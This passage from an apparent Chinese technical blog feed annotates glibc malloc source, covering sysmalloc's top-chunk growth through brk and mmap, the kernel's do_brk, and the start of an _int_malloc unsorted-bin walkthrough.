&#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>MORECORE</code>是一个宏定义，其最终是通过系统调用分配内存，定义在linux内核的mmap.c文件中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">SYSCALL_DEFINE1(brk, unsigned long, brk)&#123;</div><div class="line"></div><div class="line">    unsigned long retval;</div><div class="line">    unsigned long newbrk, oldbrk;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    unsigned long min_brk;</div><div class="line">    bool populate;</div><div class="line"></div><div class="line">    down_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    min_brk = mm-&gt;start_brk;</div><div class="line">    if (brk &lt; min_brk)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    if (check_data_rlimit(rlimit(RLIMIT_DATA), brk, mm-&gt;start_brk,</div><div class="line">                  mm-&gt;end_data, mm-&gt;start_data))</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    newbrk = PAGE_ALIGN(brk);</div><div class="line">    oldbrk = PAGE_ALIGN(mm-&gt;brk);</div><div class="line">    if (oldbrk == newbrk)</div><div class="line">        goto set_brk;</div><div class="line"></div><div class="line">    if (brk &lt;= mm-&gt;brk) &#123;</div><div class="line">        if (!do_munmap(mm, newbrk, oldbrk-newbrk))</div><div class="line">            goto set_brk;</div><div class="line">        goto out;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (find_vma_intersection(mm, oldbrk, newbrk+PAGE_SIZE))</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    if (do_brk(oldbrk, newbrk-oldbrk) != oldbrk)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">set_brk:</div><div class="line">    mm-&gt;brk = brk;</div><div class="line">    populate = newbrk &gt; oldbrk &amp;&amp; (mm-&gt;def_flags &amp; VM_LOCKED) != 0;</div><div class="line">    up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    if (populate)</div><div class="line">        mm_populate(oldbrk, newbrk - oldbrk);</div><div class="line">    return brk;</div><div class="line"></div><div class="line">out:</div><div class="line">    retval = mm-&gt;brk;</div><div class="line">    up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先会对传入堆的新地址<code>brk</code>做一些检查，然后该新地址小于原本的<code>brk</code>，就需要通过<code>do_munmap</code>释放虚拟内存，以减少堆的大小；反之，就通过<code>do_brk</code>增加堆得大小。其中<code>find_vma_intersection</code>用来判断增加堆空间后，是否会占用已经被分配的虚拟内存，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">static inline struct vm_area_struct * find_vma_intersection(struct mm_struct * mm, unsigned long start_addr, unsigned long end_addr)&#123;</div><div class="line">    struct vm_area_struct * vma = find_vma(mm,start_addr);</div><div class="line"></div><div class="line">    if (vma &amp;&amp; end_addr &lt;= vma-&gt;vm_start)</div><div class="line">        vma = NULL;</div><div class="line">    return vma;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因为是增加堆的大小，因此只需要关心<code>do_brk</code>函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">static unsigned long do_brk(unsigned long addr, unsigned long len)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    struct vm_area_struct *vma, *prev;</div><div class="line">    unsigned long flags;</div><div class="line">    struct rb_node **rb_link, *rb_parent;</div><div class="line">    pgoff_t pgoff = addr &gt;&gt; PAGE_SHIFT;</div><div class="line">    int error;</div><div class="line"></div><div class="line">    len = PAGE_ALIGN(len);</div><div class="line">    if (!len)</div><div class="line">        return addr;</div><div class="line"></div><div class="line">    flags = VM_DATA_DEFAULT_FLAGS | VM_ACCOUNT | mm-&gt;def_flags;</div><div class="line"></div><div class="line">    error = get_unmapped_area(NULL, addr, len, 0, MAP_FIXED);</div><div class="line">    if (error &amp; ~PAGE_MASK)</div><div class="line">        return error;</div><div class="line"></div><div class="line">    error = mlock_future_check(mm, mm-&gt;def_flags, len);</div><div class="line">    if (error)</div><div class="line">        return error;</div><div class="line"></div><div class="line">    verify_mm_writelocked(mm);</div><div class="line"></div><div class="line">    while (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link,</div><div class="line">                  &amp;rb_parent)) &#123;</div><div class="line">        if (do_munmap(mm, addr, len))</div><div class="line">            return -ENOMEM;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT))</div><div class="line">        return -ENOMEM;</div><div class="line"></div><div class="line">    if (mm-&gt;map_count &gt; sysctl_max_map_count)</div><div class="line">        return -ENOMEM;</div><div class="line"></div><div class="line">    if (security_vm_enough_memory_mm(mm, len &gt;&gt; PAGE_SHIFT))</div><div class="line">        return -ENOMEM;</div><div class="line"></div><div class="line">    vma = vma_merge(mm, prev, addr, addr + len, flags,</div><div class="line">                    NULL, NULL, pgoff, NULL);</div><div class="line">    if (vma)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);</div><div class="line">    if (!vma) &#123;</div><div class="line">        vm_unacct_memory(len &gt;&gt; PAGE_SHIFT);</div><div class="line">        return -ENOMEM;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain);</div><div class="line">    vma-&gt;vm_mm = mm;</div><div class="line">    vma-&gt;vm_start = addr;</div><div class="line">    vma-&gt;vm_end = addr + len;</div><div class="line">    vma-&gt;vm_pgoff = pgoff;</div><div class="line">    vma-&gt;vm_flags = flags;</div><div class="line">    vma-&gt;vm_page_prot = vm_get_page_prot(flags);</div><div class="line">    vma_link(mm, vma, prev, rb_link, rb_parent);</div><div class="line">out:</div><div class="line">    perf_event_mmap(vma);</div><div class="line">    mm-&gt;total_vm += len &gt;&gt; PAGE_SHIFT;</div><div class="line">    if (flags &amp; VM_LOCKED)</div><div class="line">        mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT);</div><div class="line">    vma-&gt;vm_flags |= VM_SOFTDIRTY;</div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码和第二章中分析的<code>mmap_region</code>函数很类似，这里简单分析如下，<code>get_unmapped_area</code>用来检查需要分配的虚拟内存地址是否已经被使用，<code>find_vma_links</code>用来查找需要插入的虚拟内存在红黑树的位置，<code>may_expand_vm</code>用来检查虚拟内存是否会超过系统的限制，<code>vma_merge</code>用来合并虚拟内存，如果不能合并，就通过slab分配一个<code>vma</code>，进行相应的设置，并通过<code>vma_link</code>插入到进程的红黑树中。</p>
<p>从linux的代码中回来，继续看<code>sysmalloc</code>，假设分配成功，会查找是否有<code>__after_morecore_hook</code>函数并执行，这里假设该函数指针为null。<br>假设分配失败，则进入<code>else</code>部分，首先对需要分配的大小按地址对齐，并且设置分配<code>size</code>的最小值为<code>MMAP_AS_MORECORE_SIZE</code>（1MB），然后通过<code>MMAP</code>宏分配内存，该函数已经在《malloc源码分析—2》分析过了。这里注意，如果是通过mmap分配的内存，则设置分配区为不连续标志位。</p>
<h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><p>继续往下看sysmalloc，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (av != &amp;main_arena) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        if (brk != (char *) (MORECORE_FAILURE)) &#123;</div><div class="line">            if (mp_.sbrk_base == 0)</div><div class="line">                mp_.sbrk_base = brk;</div><div class="line">            av-&gt;system_mem += size;</div><div class="line"></div><div class="line">            if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE))</div><div class="line">                set_head(old_top, (size + old_size) | PREV_INUSE);</div><div class="line">            else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123;</div><div class="line">                malloc_printerr(3, &quot;break adjusted to free malloc space&quot;, brk, av);</div><div class="line">            &#125;</div><div class="line">            else &#123;</div><div class="line">                front_misalign = 0;</div><div class="line">                end_misalign = 0;</div><div class="line">                correction = 0;</div><div class="line">                aligned_brk = brk;</div><div class="line"></div><div class="line">                if (contiguous(av)) &#123;</div><div class="line">                    if (old_size)</div><div class="line">                        av-&gt;system_mem += brk - old_end;</div><div class="line"></div><div class="line">                    front_misalign = (INTERNAL_SIZE_T) chunk2mem(</div><div class="line">                            brk) &amp; MALLOC_ALIGN_MASK;</div><div class="line">                    if (front_misalign &gt; 0) &#123;</div><div class="line">                        correction = MALLOC_ALIGNMENT - front_misalign;</div><div class="line">                        aligned_brk += correction;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    correction += old_size;</div><div class="line">                    end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);</div><div class="line">                    correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;</div><div class="line"></div><div class="line">                    assert(correction &gt;= 0);</div><div class="line">                    snd_brk = (char *) (MORECORE(correction));</div><div class="line"></div><div class="line">                    if (snd_brk == (char *) (MORECORE_FAILURE)) &#123;</div><div class="line">                        correction = 0;</div><div class="line">                        snd_brk = (char *) (MORECORE(0));</div><div class="line">                    &#125; else &#123;</div><div class="line">                        void (*hook)(</div><div class="line">                        void) = atomic_forced_read (__after_morecore_hook);</div><div class="line">                        if (__builtin_expect (hook != NULL, 0))</div><div class="line">                        (*hook)();</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                ...</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>假设增加了主分配区的top chunk成功，则更新<code>sbrk_base</code>和分配区已分配的内存大小。<br>然后，第一个判断表示，新分配的内存地址和原来的<code>top chunk</code>连续，并且不是通过<code>MMAP</code>分配的，这时只需要更新原来top chunk的大小<code>size</code>。<br>第二个判断表示如果分配区的连续标志位置位，top chunk的大小大于0，但是分配的<code>brk</code>小于原来的top chunk结束地址，这里就判定出错了。<br>进入第三个判断表示新分配的内存地址大于原来的top chunk的结束地址，但是不连续。这种情况下，如果分配区的连续标志位置位，则表示不是通过MMAP分配的，肯定有其他线程调用了<code>brk</code>在堆上分配了内存，<code>av-&gt;system_mem += brk - old_end</code>表示将其他线程分配的内存一并计入到该分配区分配的内存大小。然后将刚刚分配的地址<code>brk</code>按<code>MALLOC_ALIGNMENT</code>对齐。<br>再往下就要处理地址不连续的问题了，因为地址不连续，就要放弃原来top chunk后面一部分的内存大小，并且将这一部分内存大小“补上”到刚刚分配的新内存后面。首先计算堆上补上内存后的结束地址并保存在<code>correction</code>中，然后调用<code>MORECORE</code>继续分配一次，将新分配内存的开始地址保存在<code>snd_brk</code>中。如果分配失败，则将<code>correction</code>设为0，并将<code>snd_brk</code>重置为原来分配的内存的结束地址，表示放弃该次补偿操作；如果分配成功，就调用<code>__after_morecore_hook</code>函数，这里假设该函数指针为<code>null</code>。</p>
<h2 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h2><p>继续往下看sysmalloc，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (av != &amp;main_arena) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        if (brk != (char *) (MORECORE_FAILURE)) &#123;</div><div class="line"></div><div class="line">            ...</div><div class="line"></div><div class="line">            if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE))</div><div class="line">                ...</div><div class="line">            else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123;</div><div class="line">                ...</div><div class="line">            &#125;</div><div class="line">            else &#123;</div><div class="line"></div><div class="line">                ...</div><div class="line"></div><div class="line">                if (contiguous(av)) &#123;</div><div class="line"></div><div class="line">                    ...</div><div class="line"></div><div class="line">                &#125;</div><div class="line"></div><div class="line">                else&#123;</div><div class="line">                    if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)</div><div class="line">                    assert (((unsigned long) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == 0);</div><div class="line">                    else&#123;</div><div class="line">                        front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;</div><div class="line">                        if (front_misalign &gt; 0)&#123;</div><div class="line">                            aligned_brk += MALLOC_ALIGNMENT - front_misalign;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    if (snd_brk == (char *) (MORECORE_FAILURE))&#123;</div><div class="line">                        snd_brk = (char *) (MORECORE (0));</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                if (snd_brk != (char *) (MORECORE_FAILURE)) &#123;</div><div class="line">                    av-&gt;top = (mchunkptr) aligned_brk;</div><div class="line">                    set_head(av-&gt;top,</div><div class="line">                            (snd_brk - aligned_brk + correction) | PREV_INUSE);</div><div class="line">                    av-&gt;system_mem += correction;</div><div class="line"></div><div class="line">                    if (old_size != 0) &#123;</div><div class="line">                        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</div><div class="line">                        set_head(old_top, old_size | PREV_INUSE);</div><div class="line"></div><div class="line">                        chunk_at_offset (old_top, old_size)-&gt;size = (2 * SIZE_SZ)</div><div class="line">                                | PREV_INUSE;</div><div class="line"></div><div class="line">                        chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size = (2</div><div class="line">                                * SIZE_SZ) | PREV_INUSE;</div><div class="line"></div><div class="line">                        if (old_size &gt;= MINSIZE) &#123;</div><div class="line">                            _int_free(av, old_top, 1);</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>开头的<code>else</code>表示分配区的连续标志没有置位，这时只要按照<code>MALLOC_ALIGNMENT</code>做简单的对齐就行了，如果是通过<code>brk</code>分配的内存，则通过<code>MORECORE (0)</code>得到新分配的内存的结束地址并保存在<code>snd_brk</code>中。<br>再往下进入<code>if</code>，设置分配区的top指针为经过对齐之后的起始地址<code>aligned_brk</code>，设置top chunk的大小<code>size</code>，<code>aligned_brk</code>表示对齐造成的误差，<code>correction</code>是因为要补偿原来top chunk剩余内存造成的误差，然后设置分配区已分配的内存大小。<br>因为不连续，最后<code>if</code>内是设置原top chunk的<code>fencepost</code>，将原来top chunk的剩余空间拆成两个<code>SIZE_SZ*2</code>大小的chunk，如果剩下的大小大于可分配的chunk的最小值<code>MINSIZE</code>，就通过<code>_int_free</code>释放掉整个剩余内存。</p>
<h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2><p>继续往下看sysmalloc最后一部分，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if ((unsigned long) av-&gt;system_mem &gt; (unsigned long) (av-&gt;max_system_mem))</div><div class="line">        av-&gt;max_system_mem = av-&gt;system_mem;</div><div class="line">    check_malloc_state (av);</div><div class="line"></div><div class="line">    p = av-&gt;top;</div><div class="line">    size = chunksize(p);</div><div class="line"></div><div class="line">    if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE )) &#123;</div><div class="line">        remainder_size = size - nb;</div><div class="line">        remainder = chunk_at_offset(p, nb);</div><div class="line">        av-&gt;top = remainder;</div><div class="line">        set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">        set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line">        check_malloced_chunk (av, p, nb);</div><div class="line">        return chunk2mem(p);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    __set_errno(ENOMEM);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就是获得前面所有代码更新后的top chunk，然后从该top chunk中分配用户需要的大小chunk并返回，如果失败则返回0。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下<code>sysmalloc</code>函数，这里不包含《malloc源码分析—2》中的代码，该代码用于初始化。首先进入<code>sysmalloc</code>函数就表示top chunk的空间不够了。<br>假设当前分配区不是主分配区，就通过<code>grow_heap</code>增加top chunk的空间，如果失败就通过<code>new_heap</code>重新分配一个heap，并将该分配区的top chunk指针指向新分配的heap的空闲内存。<br>如果当前分配区是主分配区，首先会通过<code>brk</code>在堆上分配内存以增加top chunk的空间，如果失败再通过<code>MMAP</code>分配。假设新分配内存的地址不连续，而分配区的连续标志位置位，就会继续分配内存以补偿。<br>最后，只要分配成功，就可以从被更新的top chunk分配所需的内存。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;malloc源码分析—sysmalloc&quot;&gt;&lt;a href=&quot;#malloc源码分析—sysmalloc&quot; class=&quot;headerlink&quot; title=&quot;malloc源码分析—sysmalloc&quot;&gt;&lt;/a&gt;malloc源码分析—sysmalloc&lt;/h1&gt;&lt;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码分析——4</title>
    <link href="http://yoursite.com/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%944/"/>
    <id>http://yoursite.com/2018/05/21/malloc源码分析——4/</id>
    <published>2018-05-21T06:41:58.000Z</published>
    <updated>2018-05-21T06:53:18.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>上一章分析了<code>_int_malloc</code>中的fastbin、smallbin和部分largebin的处理，本章继续往下看余下的代码。最后会对整个<code>_int_malloc</code>做一个总结。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line">        int iters = 0;</div><div class="line">        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;</div><div class="line">            bck = victim-&gt;bk;</div><div class="line">            if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</div><div class="line">                    || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))</div><div class="line">                malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,</div><div class="line">                        chunk2mem(victim), av);</div><div class="line">            size = chunksize(victim);</div><div class="line"></div><div class="line">            if (in_smallbin_range (nb) &amp;&amp;</div><div class="line">            bck == unsorted_chunks (av) &amp;&amp;</div><div class="line">            victim == av-&gt;last_remainder &amp;&amp;</div><div class="line">            (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;</div><div class="line">                remainder_size = size - nb;</div><div class="line">                remainder = chunk_at_offset(victim, nb);</div><div class="line">                unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</div><div class="line">                av-&gt;last_remainder = remainder;</div><div class="line">                remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</div><div class="line">                if (!in_smallbin_range(remainder_size)) &#123;</div><div class="line">                    remainder-&gt;fd_nextsize = NULL;</div><div class="line">                    remainder-&gt;bk_nextsize = NULL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                set_head(victim,</div><div class="line">                        nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">                set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line">                set_foot(remainder, remainder_size);</div><div class="line"></div><div class="line">                check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            unsorted_chunks (av)-&gt;bk = bck;</div><div class="line">            bck-&gt;fd = unsorted_chunks (av);</div><div class="line"></div><div class="line">            if (size == nb) &#123;</div><div class="line">                set_inuse_bit_at_offset(victim, size);</div><div class="line">                if (av != &amp;main_arena)</div><div class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">                check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            ...</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这部分代码的整体意思就是遍历unsortedbin，从中查找是否有符合用户要求大小的chunk并返回。<br>第一个while循环从尾到头依次取出unsortedbin中的所有chunk，将该chunk对应的前一个chunk保存在<code>bck</code>中，并将大小保存在<code>size</code>中。<br>如果用户需要分配的内存大小对应的chunk属于smallbin，unsortedbin中只有这一个chunk，并且该chunk属于last remainder chunk且其大小大于用户需要分配内存大小对应的chunk大小加上最小的chunk大小（保证可以拆开成两个chunk），就将该chunk拆开成两个chunk，分别为<code>victim</code>和<code>remainder</code>，进行相应的设置后，将用户需要的<code>victim</code>返回。<br>如果不能拆开，就从unsortedbin中取出该chunk（<code>victim</code>）。<br>再下来，如果刚刚从unsortedbin中取出的<code>victim</code>正好是用户需要的大小<code>nb</code>，就设置相应的标志位，直接返回该<code>victim</code>。</p>
<p>继续往下看<code>_int_malloc</code>函数，为了使整个代码结构清晰，这里保留了外层的for循环和while循环。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div 